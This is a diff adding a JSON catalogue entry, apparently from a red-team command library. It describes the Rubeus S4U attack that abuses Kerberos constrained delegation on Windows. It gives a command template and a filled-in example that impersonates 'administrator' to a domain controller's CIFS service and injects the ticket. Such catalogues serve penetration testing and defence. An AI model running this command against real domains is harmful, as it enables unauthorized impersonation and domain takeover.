@@ -1,0 +1,24 @@
+{
+  "id": "rubeus-s4u",
+  "name": "Rubeus S4U Delegation",
+  "command": ".\\Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:<target_user> /msdsspn:<service>/<target_host> /ptt",
+  "description": "Abuse constrained delegation via S4U on Windows using Rubeus",
+  "platform": "windows",
+  "requires": [
+    "ticket"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "rubeus",
+    "s4u",
+    "delegation",
+    "constrained",
+    "windows",
+    "impersonation"
+  ],
+  "examples": [
+    ".\\Rubeus.exe s4u /user:svc_account /rc4:e19ccf75ee54e06b06a5907af13cef42 /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /ptt"
+  ]
+}
